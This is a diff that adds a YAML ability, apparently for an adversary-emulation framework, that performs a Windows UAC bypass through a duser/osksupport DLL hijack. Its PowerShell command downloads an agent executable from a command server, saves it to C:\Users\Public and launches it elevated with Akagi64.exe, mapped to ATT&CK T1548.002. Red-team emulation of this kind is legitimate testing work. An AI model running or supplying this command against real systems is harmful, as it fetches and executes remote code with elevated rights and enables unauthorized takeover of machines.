@@ -1,0 +1,24 @@
+- id: e99cce5c-cb7e-4a6e-8a09-1609a221b90a
+  description: UIPI bypass with uiAccess application
+  name: duser/osksupport DLL Hijack
+  platforms:
+    windows:
+      psh:
+        command: |
+          $url="#{server}/file/download";
+          $wc=New-Object System.Net.WebClient;
+          $wc.Headers.add("platform","windows");
+          $wc.Headers.add("file","sandcat.go");
+          $wc.Headers.add("server","#{server}");
+          $wc.Headers.add("defaultSleep","60");
+          $wc.Headers.add("defaultGroup","bypassed_u_bro");
+          $data=$wc.DownloadData($url);
+          $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
+          [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);
+          .\Akagi64.exe 32 "C:\Users\Public\$name.exe -server #{server}"
+        payloads:
+        - Akagi64.exe
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.002
+    name: "Abuse Elevation Control Mechanism: Bypass User Access Control"
